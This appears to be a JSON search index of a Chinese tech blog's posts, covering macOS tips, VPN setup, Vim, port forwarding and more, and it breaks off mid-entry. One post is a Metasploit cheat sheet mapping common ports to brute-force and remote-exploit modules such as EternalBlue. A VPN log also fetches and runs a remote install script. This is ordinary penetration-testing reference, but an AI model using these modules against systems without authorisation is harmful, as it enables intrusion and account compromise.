[{"title":"MacOS出现/usr/bin/ulimit: line 4: ulimit: open files: cannot modify limit: Invalid argument解决方案","url":"%2F2018%2F10%2F31%2FMacOS%E5%87%BA%E7%8E%B0-usr-bin-ulimit-line-4-ulimit-open-files-cannot-modify-limit-Invalid-argument%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F","content":"\n\n\n### 症状\n\n```bash\n$ sudo ulimit -n 65535\n/usr/bin/ulimit: line 4: ulimit: open files: cannot modify limit: Invalid argument\n```\n\n\n\n### 解决方案\n\n```bash\n➜  ~ echo kern.maxfiles=65535 | sudo tee -a /etc/sysctl.conf\nPassword:\nkern.maxfiles=65535\n➜  ~ echo kern.maxfilesperproc=65535 | sudo tee -a /etc/sysctl.conf\nkern.maxfilesperproc=65535\n➜  ~ sudo sysctl -w kern.maxfiles=65535\nkern.maxfiles: 12288 -> 65535\n➜  ~ sudo sysctl -w kern.maxfilesperproc=65535\nkern.maxfilesperproc: 10240 -> 65535\n➜  ~ ulimit -n 65535 65535\n➜  ~ ulimit -a\n-t: cpu time (seconds)              unlimited\n-f: file size (blocks)              65535\n-d: data seg size (kbytes)          unlimited\n-s: stack size (kbytes)             8192\n-c: core file size (blocks)         0\n-v: address space (kbytes)          unlimited\n-l: locked-in-memory size (kbytes)  unlimited\n-u: processes                       709\n-n: file descriptors                65535\n➜  ~\n```\n\nVia: [http://blog.mact.me/2014/10/22/yosemite-upgrade-changes-open-file-limit](http://blog.mact.me/2014/10/22/yosemite-upgrade-changes-open-file-limit)","tags":["ulimit"]},{"title":"asciinema终端操作最好的录制工具,谁用谁知道","url":"%2F2018%2F09%2F26%2Fasciinema%E7%BB%88%E7%AB%AF%E6%93%8D%E4%BD%9C%E6%9C%80%E5%A5%BD%E7%9A%84%E5%BD%95%E5%88%B6%E5%B7%A5%E5%85%B7-%E8%B0%81%E7%94%A8%E8%B0%81%E7%9F%A5%E9%81%93%2F","content":"\n## Asciinema 终端录屏工具\n\n#### 官方介绍\n\n官网地址: [https://asciinema.org/](https://asciinema.org/)\n\n可以点击导航到官网，一切都会明白。\n\n### 安装过程\n\n有英文基础请看这里: [https://asciinema.org/docs/getting-started](https://asciinema.org/docs/getting-started)\n\n> 没有就去学英文吖！\n\n### 终端帮助\n\n```bash\n➜  ~ asciinema \nusage: asciinema [-h] [--version] {rec,play,cat,upload,auth} ...\n\nRecord and share your terminal sessions, the right way.\n\npositional arguments:\n  {rec,play,cat,upload,auth}\n    rec                 Record terminal session\n    play                Replay terminal session\n    cat                 Print full output of terminal session\n    upload              Upload locally saved terminal session to asciinema.org\n    auth                Manage recordings on asciinema.org account\n\noptional arguments:\n  -h, --help            show this help message and exit\n  --version             show program's version number and exit\n\nexample usage:\n  Record terminal and upload it to asciinema.org:\n    asciinema rec\n  Record terminal to local file:\n    asciinema rec demo.cast\n  Record terminal and upload it to asciinema.org, specifying title:\n    asciinema rec -t \"My git tutorial\"\n  Record terminal to local file, limiting idle time to max 2.5 sec:\n    asciinema rec -i 2.5 demo.cast\n  Replay terminal recording from local file:\n    asciinema play demo.cast\n  Replay terminal recording hosted on asciinema.org:\n    asciinema play https://asciinema.org/a/difqlgx86ym6emrmd8u62yqu8\n  Print full output of recorded session:\n    asciinema cat demo.cast\n\nFor help on a specific command run:\n  asciinema <command> -h\n➜  ~\n```\n\n"},{"title":"Sed批量遍历文件替换文件内容","url":"%2F2018%2F09%2F13%2FSed%E6%89%B9%E9%87%8F%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E6%9B%BF%E6%8D%A2%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%2F","content":"\n\n\nMacOS:\n\n> 遍历 修改 /tmp/ 目录下 所有包含 aaaa的文件，将aaaa替换成bbbb并不备份\n\n```\nsed -i '' 's/aaaa/bbbb/g' `grep aaaa -rl /tmp/`\n```\n\n> 遍历 修改 /tmp/ 目录下 所有包含 aaaa的文件，将aaaa替换成bbbb并备份修改前文件，命名为原文件名+ \".bak\"\n\n```\nsed -i '.bak' 's/aaaa/bbbb/g' `grep aaaa -rl /tmp/`\n```\n\n","categories":["MacOS 笔记"]},{"title":"如何使用黑客字体","url":"%2F2018%2F09%2F09%2F%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E9%BB%91%E5%AE%A2%E5%AD%97%E4%BD%93%2F","content":"\nTTF: [https://watchdogsfont.com/font/HACKED_Title.ttf](https://watchdogsfont.com/font/HACKED_Title.ttf)\n\nCSS:\n\n```css\nbody{\n}\n.h1,h2,h3,h4,h5,h6 {\n\t\t\tcolor: #20B2AA;\n\t\t\tsize: 89px;\n}\n@font-face {\n    font-family: hacker;\n    src: url(https://watchdogsfont.com/font/HACKED_Title.ttf);\n}  \n\n```\n\nHTML:\n\n```html\n<html>\n<title> Hacked </title>\n<style>\n\tbody{\n}\n.h1,h2,h3,h4,h5,h6 {\n\t\t\tcolor: #20B2AA;\n\t\t\tsize: 89px;\n}\n@font-face {\n    font-family: hacker;\n    src: url(https://watchdogsfont.com/font/HACKED_Title.ttf);\n}  \n</style>\n    <body>\n        <center>\n        <br>\n        <font size=10 color=cyan face=hacker> Hello <br> This is The Hack Font</font>\n        <br>\n        </center>\n    </body>\n</html>\n```\n\n\n"},{"title":"For Free,For World,For Google","url":"%2F2018%2F09%2F08%2FFor-Free-For-World-For-Google%2F","content":"\n\n\n这是一篇能看见世界之外的文章，免费的科学Tizi。\n\n> 无限时间，无限流量，无限速度，长期稳定。\n\n1. 打开 [https://www.azirevpn.com/](https://www.azirevpn.com/) 注册\n\n   右上角注册，激活码不用填，其他必填。\n\n   记得去邮箱激活账户，然后登陆。\n\n2. 打开 [https://www.azirevpn.com/wireguard](https://www.azirevpn.com/wireguard) 安装\n\n   根据你当前的系统选择进行安装。\n\n   Linux: [https://www.azirevpn.com/support/guides/computer/linux/wireguard-cli](https://www.azirevpn.com/support/guides/computer/linux/wireguard-cli)\n\n   macOS: [https://www.azirevpn.com/support/guides/computer/macos/wireguard-cli](https://www.azirevpn.com/support/guides/computer/macos/wireguard-cli)\n\n   Android: [https://www.azirevpn.com/support/guides/mobile/android/wireguard](https://www.azirevpn.com/support/guides/mobile/android/wireguard)\n\n   注意：官方只有Linux 、macOS、Android的安装与使用方法，这里 `Windows` 用户需要下载一个叫`Tunsafe` 的软件（具体自行搜索下载），然后点击 [https://www.azirevpn.com/cfg/wireguard](https://www.azirevpn.com/cfg/wireguard) 再次输入你的账号与密码，点击 `Download Configuration` ,下载你的配置文件，这个操作会有点慢，下载好了是一个压缩包文件，解压之后便是多个线路配置文件，拖放到Tunsafe界面或导入到Tunsafe连接即可。\n\n3. 根据上面连接的过程，安装执行即可 (英文水准好的可自行操作)。\n\n   我是macOS系统，下面是我的终端日志：\n\n   ```bash\n   ➜  ~ brew install wireguard-tools jq\n   Updating Homebrew...\n   ==> Auto-updated Homebrew!\n   Updated 2 taps (homebrew/core, homebrew/cask).\n   ==> New Formulae\n   bloaty                     golang-migrate             prototool\n   cmdshelf                   json11                     rbspy\n   cwlogs                     libpsl                     topgrade\n   eslint                     libsignal-protocol-c       wcslib\n   geogram                    luit                       wsk\n   go@1.10                    pagmo\n   ==> Updated Formulae\n   glib ✔                     ghostscript                mongodb\n   go ✔                       giflib                     mongodb@3.2\n   node ✔                     gifski                     multimarkdown\n   p11-kit ✔                  git-archive-all            nats-streaming-server\n   unrar ✔                    git-cola                   nco\n   vim ✔                      git-ftp                    ncview\n   adwaita-icon-theme         git-quick-stats            netcdf\n   alexjs                     gitbucket                  nghttp2\n   angular-cli                gitlab-runner              nginx\n   anjuta                     gitup                      node-build\n   annie                      gjs                        nspr\n   ansible                    glib-networking            nsq\n   apktool                    glslviewer                 nss\n   armadillo                  gmt                        ocrmypdf\n   artifactory                gmt@4                      octave\n   at-spi2-core               gnatsd                     oniguruma\n   atlassian-cli              gnu-indent                 open-mpi\n   augeas                     gnupg                      openapi-generator\n   autopep8                   gobject-introspection      openblas\n   aws-okta                   gobuster                   openrct2\n   awscli                     godep                      openrtsp\n   azure-cli                  goenv                      openssh\n   babel                      gomplate                   osquery\n   baobab                     goreleaser                 parallel\n   bat                        gpac                       pcl\n   bear                       gradle                     pdal\n   bibutils                   grafana                    pdftoedn\n   bison                      gromacs                    pdftoipe\n   bitwarden-cli              grpc                       pdns\n   bro                        gsettings-desktop-schemas  pdnsrec\n   buku                       gsoap                      perl-build\n   bwfmetaedit                gtksourceview3             php\n   bzt                        gtksourceview@4            php-cs-fixer\n   caf                        gucharmap                  phpmyadmin\n   caffe                      hadolint                   phpunit\n   calabash                   hcloud                     picard-tools\n   capnp                      hdf5                       plantuml\n   cataclysm                  hebcal                     poppler\n   ccache                     helmfile                   presto\n   certbot                    heroku                     prettier\n   cgal                       htmldoc                    pumba\n   chakra                     hub                        pushpin\n   checkbashisms              hugo                       pygobject3\n   cimg                       i2p                        pyside\n   circleci                   imagemagick                quicktype\n   citus                      imagemagick@6              rclone\n   ckan                       influxdb                   re2c\n   cmake                      ios-deploy                 s6\n   cmocka                     iso-codes                  saxon\n   convox                     jadx                       sbcl\n   crystal                    jenkins                    sceptre\n   curl                       jenkins-job-builder        shibboleth-sp\n   dartsim                    jfrog-cli-go               skaffold\n   davmail                    jhipster                   smali\n   deark                      jsonrpc-glib               smlnj\n   deployer                   juju                       sourcekitten\n   dhall-json                 kakoune                    sourcery\n   diff-pdf                   kallisto                   sphinx-doc\n   diffoscope                 kapacitor                  sratoolkit\n   dita-ot                    kettle                     ssh-copy-id\n   django-completion          kibana@5.6                 svtplay-dl\n   dnstwist                   knot                       swiftformat\n   docker                     kore                       tarantool\n   docker-completion          kubectx                    tarsnap-gui\n   docker-compose             ldc                        telegraf\n   docker-squash              lf                         telnet\n   doctl                      lftp                       template-glib\n   dosbox                     libarchive                 terraform_landscape\n   dropbear                   libbi                      terragrunt\n   duo_unix                   libdazzle                  thors-serializer\n   dxpy                       libmatio                   tile38\n   dynare                     libphonenumber             tokei\n   elasticsearch@5.6          libre                      tomcat\n   elixir                     librtlsdr                  tomcat-native\n   elm                        libsoup                    tomcat@7\n   elm-format                 libtensorflow              tomcat@8\n   emscripten                 libxlsxwriter              travis\n   erlang                     liquigraph                 trezor-agent\n   erlang@20                  logtalk                    typescript\n   ethereum                   lolcat                     uftp\n   evince                     lrzsz                      v8\n   exercism                   lynis                      vagrant-completion\n   faas-cli                   mackup                     vala\n   fauna-shell                mdcat                      valabind\n   fdk-aac-encoder            mdds                       vault\n   feedgnuplot                mdp                        verilator\n   field3d                    media-info                 vte3\n   file-roller                mercurial                  vtk\n   firebase-cli               meson                      webpack\n   flann                      meson-internal             wildfly-as\n   flatcc                     mesos                      wireguard-tools\n   flow                       metabase                   wireshark\n   fluent-bit                 metashell                  wp-cli\n   fn                         mill                       wp-cli-completion\n   folly                      minimesos                  xml-tooling-c\n   fontconfig                 minizinc                   xonsh\n   fortio                     mkcert                     xtensor\n   freetds                    mkdocs                     yelp-tools\n   futhark                    mkvtoolnix                 youtube-dl\n   gauge                      mlkit                      yubico-piv-tool\n   gdal                       mmseqs2                    zabbix\n   gdk-pixbuf                 monax                      zsh\n   gedit                      monetdb                    zsh-completions\n   ==> Renamed Formulae\n   rebar@3 -> rebar3\n   ==> Deleted Formulae\n   ghc@8.0\n   \n   ==> Installing dependencies for wireguard-tools: bash, wireguard-go\n   ==> Installing wireguard-tools dependency: bash\n   ==> Downloading https://homebrew.bintray.com/bottles/bash-4.4.23.high_sierra.bot\n   ######################################################################## 100.0%\n   ==> Pouring bash-4.4.23.high_sierra.bottle.tar.gz\n   ==> Caveats\n   In order to use this build of bash as your login shell,\n   it must be added to /etc/shells.\n   ==> Summary\n   🍺  /usr/local/Cellar/bash/4.4.23: 146 files, 8.8MB\n   ==> Installing wireguard-tools dependency: wireguard-go\n   ==> Downloading https://homebrew.bintray.com/bottles/wireguard-go-0.0.20180613.h\n   ######################################################################## 100.0%\n   ==> Pouring wireguard-go-0.0.20180613.high_sierra.bottle.tar.gz\n   🍺  /usr/local/Cellar/wireguard-go/0.0.20180613: 5 files, 4.2MB\n   ==> Installing wireguard-tools\n   ==> Downloading https://homebrew.bintray.com/bottles/wireguard-tools-0.0.2018090\n   ######################################################################## 100.0%\n   ==> Pouring wireguard-tools-0.0.20180904.high_sierra.bottle.tar.gz\n   ==> Caveats\n   Bash completion has been installed to:\n     /usr/local/etc/bash_completion.d\n   ==> Summary\n   🍺  /usr/local/Cellar/wireguard-tools/0.0.20180904: 10 files, 139.5KB\n   ==> Installing dependencies for jq: oniguruma\n   ==> Installing jq dependency: oniguruma\n   ==> Downloading https://homebrew.bintray.com/bottles/oniguruma-6.9.0.high_sierra\n   ######################################################################## 100.0%\n   ==> Pouring oniguruma-6.9.0.high_sierra.bottle.tar.gz\n   🍺  /usr/local/Cellar/oniguruma/6.9.0: 17 files, 1.3MB\n   ==> Installing jq\n   ==> Downloading https://homebrew.bintray.com/bottles/jq-1.5_3.high_sierra.bottle\n   ######################################################################## 100.0%\n   ==> Pouring jq-1.5_3.high_sierra.bottle.tar.gz\n   🍺  /usr/local/Cellar/jq/1.5_3: 19 files, 946.6KB\n   ==> Caveats\n   ==> bash\n   In order to use this build of bash as your login shell,\n   it must be added to /etc/shells.\n   ==> wireguard-tools\n   Bash completion has been installed to:\n     /usr/local/etc/bash_completion.d\n   ➜  ~ curl -LO https://www.azirevpn.com/dl/azirevpn-wg.sh && chmod +x ./azirevpn-wg.sh && ./azirevpn-wg.sh\n     % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                    Dload  Upload   Total   Spent    Left  Speed\n   100  3494  100  3494    0     0   1147      0  0:00:03  0:00:03 --:--:--  1147\n   [?] azirevpn-wg.sh must be run as root. Please enter the password for lfoder to continue: \n   [?] Please enter your AzireVPN username: lfoder\n   [?] Please enter your AzireVPN password: \n   [+] Contacting AzireVPN API for server locations.\n   [+] Generating new se1 private key.\n   [+] Contacting AzireVPN API in Stockholm, Sweden.\n   [+] Writing WriteGuard configuration file to /etc/wireguard/azirevpn-se1.conf.\n   [+] Generating new uk1 private key.\n   [+] Contacting AzireVPN API in London, United Kingdom.\n   [+] Writing WriteGuard configuration file to /etc/wireguard/azirevpn-uk1.conf.\n   [+] Generating new es1 private key.\n   [+] Contacting AzireVPN API in Malaga, Spain.\n   [+] Writing WriteGuard configuration file to /etc/wireguard/azirevpn-es1.conf.\n   [+] Generating new us1 private key.\n   [+] Contacting AzireVPN API in Miami, United States.\n   [+] Writing WriteGuard configuration file to /etc/wireguard/azirevpn-us1.conf.\n   [+] Generating new ca1 private key.\n   [+] Contacting AzireVPN API in Toronto, Canada.\n   [+] Writing WriteGuard configuration file to /etc/wireguard/azirevpn-ca1.conf.\n   [+] Success. The following commands may be run for connecting to AzireVPN:\n   - Stockholm, Sweden:\n     $ wg-quick up azirevpn-se1\n   - London, United Kingdom:\n     $ wg-quick up azirevpn-uk1\n   - Malaga, Spain:\n     $ wg-quick up azirevpn-es1\n   - Miami, United States:\n     $ wg-quick up azirevpn-us1\n   - Toronto, Canada:\n     $ wg-quick up azirevpn-ca1\n   ➜  ~ wg-quick up azirevpn-se1\n   [#] wireguard-go utun\n   WARNING WARNING WARNING WARNING WARNING WARNING WARNING\n   W                                                     G\n   W   This is alpha software. It will very likely not   G\n   W   do what it is supposed to do, and things may go   G\n   W   horribly wrong. You have been warned. Proceed     G\n   W   at your own risk.                                 G\n   W                                                     G\n   WARNING WARNING WARNING WARNING WARNING WARNING WARNING\n   INFO: (utun3) 2018/09/08 22:30:43 Starting wireguard-go version 0.0.20180613\n   [+] Interface for azirevpn-se1 is utun3\n   [#] wg setconf utun3 /dev/fd/63\n   [#] ifconfig utun3 inet 10.10.12.125/19 10.10.12.125 alias\n   [#] ifconfig utun3 inet6 2a03:8600:1001:4000::c7e/64 alias\n   [#] ifconfig utun3 up\n   [#] route -q -n add -inet6 ::/1 -interface utun3\n   [#] route -q -n add -inet6 8000::/1 -interface utun3\n   [#] route -q -n add -inet 0.0.0.0/1 -interface utun3\n   [#] route -q -n add -inet 128.0.0.0/1 -interface utun3\n   [#] route -q -n add -inet 193.180.164.58 -gateway 192.168.1.1\n   [#] networksetup -getdnsservers USB 10/100/1000 LAN\n   [#] networksetup -getdnsservers iPhone USB\n   [#] networksetup -getdnsservers Wi-Fi\n   [#] networksetup -getdnsservers Bluetooth PAN\n   [#] networksetup -getdnsservers Thunderbolt Bridge\n   [#] networksetup -getdnsservers AnyLink\n   [#] networksetup -getdnsservers PgyMacClient\n   [#] networksetup -setdnsservers AnyLink 91.231.153.2 2001:67c:15ec:1337::2\n   [#] networksetup -setdnsservers Thunderbolt Bridge 91.231.153.2 2001:67c:15ec:1337::2\n   [#] networksetup -setdnsservers Wi-Fi 91.231.153.2 2001:67c:15ec:1337::2\n   [#] networksetup -setdnsservers USB 10/100/1000 LAN 91.231.153.2 2001:67c:15ec:1337::2\n   [#] networksetup -setdnsservers Bluetooth PAN 91.231.153.2 2001:67c:15ec:1337::2\n   [#] networksetup -setdnsservers PgyMacClient 91.231.153.2 2001:67c:15ec:1337::2\n   [#] networksetup -setdnsservers iPhone USB 91.231.153.2 2001:67c:15ec:1337::2\n   [+] Backgrounding route monitor\n   ➜  ~ curl ip.cn\n   当前 IP：193.180.164.58 来自：瑞典\n   ➜  ~ wg-quick down azirevpn-se1\n   [+] Interface for azirevpn-se1 is utun3\n   [#] rm -f /var/run/wireguard/utun3.sock\n   [#] rm -f /var/run/wireguard/azirevpn-se1.name\n   ➜  ~ \n   ```\n\n\n\n共勉。\n\n"},{"title":"Windows静默安装WinPcap包","url":"%2F2018%2F07%2F22%2FWindows%E9%9D%99%E9%BB%98%E5%AE%89%E8%A3%85WinPcap%E5%8C%85%2F","content":"\n"},{"title":"纯CSS实现随机页面背景图自适应","url":"%2F2018%2F07%2F18%2F%E7%BA%AFCSS%E5%AE%9E%E7%8E%B0%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2%E8%83%8C%E6%99%AF%E5%9B%BE%E8%87%AA%E9%80%82%E5%BA%94%2F","content":"\n纯CSS实现让页面自动随机更换背景并图片自适应操作，以下是代码部分。\n\n客观请慢用 ...\n\n代码:\n\n```html\n<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<meta charset=\"UTF-8\">\n\t\t<title>随机切换网页背景图效果-css实现</title>\n\t</head>\n\t<style>\n\t\tbody{\n\t\t\tposition: fixed;\n\t\t    width: 100%;\n\t\t    background-repeat: no-repeat;\n\t\t    background-size: cover;\n\t\t    z-index: 1;\n\t\t    top: 0;\n\t\t    left: 0;\n\t\t    background-position: center 0%;\n\t\t    background-attachment: fixed;\n\t\t    height: 100%;\n\t\t    background-image: url(https://unsplash.it/1600/900?random);\n\t\t}\n\t</style>\n\t<body>\n\t</body>\n</html>\n\n```\n\n效果 (尝试拉动浏览器边框改变浏览器大小)：\n\n<div id=\"test\" style=\"\n\t\t    width: 100%;\n\t\t    background-repeat: no-repeat;\n\t\t    background-size: cover;\n\t\t    z-index: 1;\n\t\t    top: 0;\n\t\t    left: 0;\n\t\t    background-position: center 0%;\n\t\t    background-attachment: fixed;\n\t\t    height: 500px;\n\t\t    background-image: url(https://unsplash.it/1600/900?random);\"/>","tags":["自适应"],"categories":["前端笔记"]},{"title":"MetaSploit针对常用端口服务的渗透测试","url":"%2F2018%2F07%2F17%2FMetaSploit%E9%92%88%E5%AF%B9%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%2F","content":"\n### 针对端口的攻击模块选择\n\n#### Port => 21 [FTP]\n\n> FTP 服务端开放监听端口\n\n模块选择:\n\n- auxiliary/scanner/ftp/ftp_login\t\t// FTP登录口令爆破\n\n#### Port => 22 [SSH]\n\n> SSH 服务开放监听端口\n\n模块选择:\n\n-  auxiliary/scanner/ssh/ssh_login \t// SSH登录口令爆破\n\n#### Port => 23 [Telnet]\n\n> telnet 服务开放监听端口\n\n模块选择:\n\n- auxiliary/scanner/telnet/telnet_login\t// Telnet 口令爆破\n\n#### Port => 445 [SMB]\n\n> SMB协议默认端口\n\n模块选择:\n\n- exploit/windows/smb/ms08_067_netapi\t\t// 远程溢出漏洞\n- exploit/windows/smb/ms17_010_eternalblue\t// 永恒之蓝 远程命令执行\n-  auxiliary/scanner/smb/smb_login  \t\t\t// SMB 登录口令爆破\n\n相关CVE:\n\n- CVE-2017-7494\t\n\n#### Port => 3389 [RDP]\n\n> Windows远程桌面默认端口\n\n模块选择:\n\n- auxiliary/scanner/rdp/ms12_020_check \n\n#### Port => 5900 [VNC]\n\n> vnc服务默认端口\n\n模块选择:\n\n- auxiliary/scanner/vnc/vnc_none_auth\n- auxiliary/scanner/vnc/vnc_login\n- exploit/multi/vnc/vnc_keyboard_exec\n\n#### Port => 1433 [SQLServer]\n\n> SQLServer 默认端口\n\n模块选择:\n\n- use auxiliary/scanner/mssql/mssql_login\n\n#### Port => 3306 [MySQL]\n\n> MySQL 数据库默认端口\n\n模块选择:\n\n- auxiliary/scanner/mysql/mysql_login\n\n#### Port => 27017,27018 [MongoDB]\n\n> MongoDB默认端口\n\n模块选择:\n\n- auxiliary/scanner/mongodb/mongodb_login \n\n#### Port => 6379 [Redis]\n\n> Redis 默认端口\n\n模块选择:\n\n- auxiliary/scanner/redis/redis_login\n- auxiliary/scanner/redis/file_upload \n\n","tags":["MetaSploit"],"categories":["MetaSploit 笔记"]},{"title":"Golang在macOS High Sierra 10.13.5上不用使用Debug的原因和处理方法","url":"%2F2018%2F07%2F10%2FGolang%E5%9C%A8macOS-High-Sierra-10-13-5%E4%B8%8A%E4%B8%8D%E7%94%A8%E4%BD%BF%E7%94%A8Debug%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%92%8C%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95%2F","content":"\n\n\n### 错误信息\n\n在 VSCode 或 Goland 中使用Debug功能是，调试窗口输出如下信息：\n\n```\n2018/07/10 17:19:15 server.go:73: Using API v1\n2018/07/10 17:19:15 debugger.go:98: launching process with args: [/Users/******/GolangProjects/**********]\ncould not launch process: EOF\nProcess exiting with code: 1\n```\n\n### 问题原因\n\n在 macOS 10.13 版本中，Command Line Tool不支持Golang的调试工具dlv\n\n>参考：\n>\n>1. [https://link.zhihu.com/?target=https%3A//intellij-support.jetbrains.com/hc/en-us/community/posts/360000164764-Goland-Debugger-could-not-launch-process-EOF](https://link.zhihu.com/?target=https%3A//intellij-support.jetbrains.com/hc/en-us/community/posts/360000164764-Goland-Debugger-could-not-launch-process-EOF)\n>2. [https://link.zhihu.com/?target=https%3A//github.com/derekparker/delve/issues/1165](https://link.zhihu.com/?target=https%3A//github.com/derekparker/delve/issues/1165)\n\n需要等待 derekparker/delve 修复这个问题\n\n### 临时解决方案\n\n目前只有 Workaround 的方法：\n\n1. 删除当前macOS系统的Command Line Tool\n\n   ```bash\n   sudo rm -rf /Library/Developer/CommandLineTools\n   ```\n\n2. 登录苹果开发者平台，然后前往 [https://developer.apple.com/download/more/](https://developer.apple.com/download/more/) 下载 **Command Line Tools (macOS 10.13) for Xcode 9.4.1** \n\n   目前我写这篇博客的时候，最新版是这个版本，你可以根据你登录平台的时间寻找最新版本下载。 \n\n3. 安装之。"},{"title":"禁止Oh-my-zsh粘贴URL特殊字符时自动转义","url":"%2F2018%2F07%2F09%2F%E7%A6%81%E6%AD%A2Oh-my-zsh%E7%B2%98%E8%B4%B4URL%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E6%97%B6%E8%87%AA%E5%8A%A8%E8%BD%AC%E4%B9%89%2F","content":"\n\n\n> 在终端下使用zsh 粘贴时会自动把URL特殊字符转义，特别是使用SQLMAP的时候\n\n\n\n把 /root/.oh-my-zsh/lib/misc.zsh 文件中的第一段 if 注释掉 OK 啦 \n\n```\n# if [[ $ZSH_VERSION != 5.1.1 ]]; then \n# for d in $fpath; do \n# if [[ -e \"$d/url-quote-magic\" ]]; then \n# if is-at-least 5.1; then \n# autoload -Uz bracketed-paste-magic \n# zle -N bracketed-paste bracketed-paste-magic \n# fi \n# autoload -Uz url-quote-magic \n# zle -N self-insert url-quote-magic \n# break \n# fi \n# done \n# fi\n```\n\n","tags":["终端优化"]},{"title":"MacOS上微信多开插件WeChatTweak(免验证登录+消息防撤回)","url":"%2F2018%2F07%2F01%2FMacOS%E4%B8%8A%E5%BE%AE%E4%BF%A1%E5%A4%9A%E5%BC%80%E6%8F%92%E4%BB%B6WeChatTweak-%E5%85%8D%E9%AA%8C%E8%AF%81%E7%99%BB%E5%BD%95-%E6%B6%88%E6%81%AF%E9%98%B2%E6%92%A4%E5%9B%9E%2F","content":"\n\n\n话不投机半句多   直入主题\n\n具体介绍 [自行百度](https://www.baidu.com/s?wd=WeChatTweak)\n\n![](https://github.com/Sunnyyoung/WeChatTweak-macOS/raw/master/Screenshot/0x01.png)\n\n### 官网\n\n[https://tweaks.app](https://tweaks.app/)\n\n### 下载插件\n\n终端执行:\n\n```\ngit clone https://github.com/Sunnyyoung/WeChatTweak-macOS.git\n```\n\n进入目录：\n\n```\ncd WeChatTweak-macOS\n```\n\n### 安装\n\n```\nsudo make install\n```\n\n### 卸载\n\n```\nsudo make unstall\n```\n\n\n\n安装好后，重启微信客户端即可生效。\n\n### 知识库\n\n具体安装过程，看作者文档\n\n[https://github.com/Sunnyyoung/WeChatTweak-macOS/wiki](https://github.com/Sunnyyoung/WeChatTweak-macOS/wiki)\n\n","tags":["免验证登录"],"categories":["MacOS 笔记"]},{"title":"MacOS升级自带Vim7.4到Vim8.0","url":"%2F2018%2F06%2F28%2FMacOS%E5%8D%87%E7%BA%A7%E8%87%AA%E5%B8%A6Vim7-4%E5%88%B0Vim8-0%2F","content":"\n## 升级MacOS系统自带的Vim到Vim8.0\n\n### 安装Vim 8.0\n\n根据个人喜好 选择安装\n\n终端Vim：\n\n```bash\nbrew install vim --with-lua --with-override-system-vi\n```\n\nGui版Vim：\n\n```bash\nbrew install macvim --with-lua --with-override-system-vim\n```\n\n安装完后vim8.0 会安装在 `/usr/local/Cellar/vim/8.1.0100_1 ` ,后面版本号因人而异。\n\nVim8.0的执行程序在 `/usr/local/Cellar/vim/8.1.0100_1/bin`\n\n我这安装了 `zsh`  ,(你可以在 [zsh安装方法](/2018/06/19/全新MacOS系统零基础配置到使用全过程/#oh-my-zsh-终端便捷操作工具) 中查看如何安装zsh)，所以 我修改环境变量的位置是 `~/.zshrc` ，没有安装`zsh` 则修改 `~/.bash_profile`\n\n添加 Vim 执行目录到 环境变量 \n\n```bash\nexport PATH=/usr/local/Cellar/vim/8.1.0100_1:$PATH\n```\n\n或者:\n\n```bash\nalias vim='/usr/local/Cellar/vim/8.1.0100_1/bin/vim'\n```\n\n然后 source 一下，使环境变量即刻生效。（没安装 zsh 的 则执行 `source ~/.bash_profile`）\n\n```bash\nsource ~/.zshrc\n```\n\n安装好后很多插件需要重新编译一下，比如 `YouCompleteMe`\n\n重新编译一下：\n\n```bash\ncd ~/.vim/bundle/YouCompleteMe\n# 平时用python与nodejs比较多的人，可以选择对应后面的两个参数，第一个需要安装xcode，第二个需要安装node与npm\n./install.py --clang-completer --tern-completer\n```\n\n\n\n\n\n\n\n### 使用\n\n输入 `mvim` 可以**从终端启动 GUI 版的 Vim**。\n\n### 更新\n\n**更新 vim 或者 macvim 到最新版**：\n\n```bash\nbrew upgrade vim/macvim\n```\n\n**添加 python3 的支持**？在以上命令基础上再加 `—with-python3`","tags":["Vim"],"categories":["MacOS 笔记"]},{"title":"Linux、Windows、MacOS端口转发全姿势","url":"%2F2018%2F06%2F27%2FLinux%E3%80%81Windows%E3%80%81MacOS%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%85%A8%E5%A7%BF%E5%8A%BF%2F","content":"\n\n\n## Windows 端口转发姿势\n\n### 通过 netsh 端口转发\n\n#### 端口转发命令\n\n```bash\nnetsh interface portproxy add v4tov4 listenport=<监听端口> connectaddress=<目标IP> connectport=<目标端口>\n```\n\n例如：将任何连接到Windows的 8080 端口流量转发到 目标机器的 80 端口\n\n```bash\nnetsh interface portproxy add v4tov4 listenport=8080 connectaddress=192.168.0.1 connectport=80\n```\n\n#### 查看映射表\n\n```bash\nnetsh interface portproxy show all\n```\n\n#### 删除映射表\n\n需要找到对应监听的端口\n\n```\nnetsh interface portproxy delete v4tov4 listenport=<监听端口>\n```\n\n\n\n## Linux 端口转发姿势\n\n> 等待更新 ...\n\n\n\n## MacOS 端口转发姿势\n\n> 等待更新 ...","tags":["Windows"],"categories":["渗透技巧"]},{"title":"全新MacOS系统零基础配置到使用全过程","url":"%2F2018%2F06%2F19%2F%E5%85%A8%E6%96%B0MacOS%E7%B3%BB%E7%BB%9F%E9%9B%B6%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%E5%88%B0%E4%BD%BF%E7%94%A8%E5%85%A8%E8%BF%87%E7%A8%8B%2F","content":"\n# 全新MacOS系统从零开始配置到顺手使用调教全过程\n\n## 当前系统环境\n\n> macOS Sierra 10.12.6\n\n写这篇博客的缘由来源于因为一些特殊原因想重置MacOS系统，导致每次重置后想要快速部署一些常用的软件以及配置一些设置需要很长时间，于是写了一篇笔记来记录自己大致的配置和优化过程，可以在下一次重置MacOS后快速优化好进入可用的顺手状态。\n\n务必按照顺序从上到下一步一步来，这篇文章只是针对自己的个人习惯来进行笔记记录，长期更新。\n\n## 基础操作配置\n\n### 调整触摸板到最佳备战状态\n\n1. 系统偏好设置  => 触摸板 =>  光标与点按 => 勾上 轻点来点按\n2. 系统偏好设置  => 触摸板 =>  更多手势 => 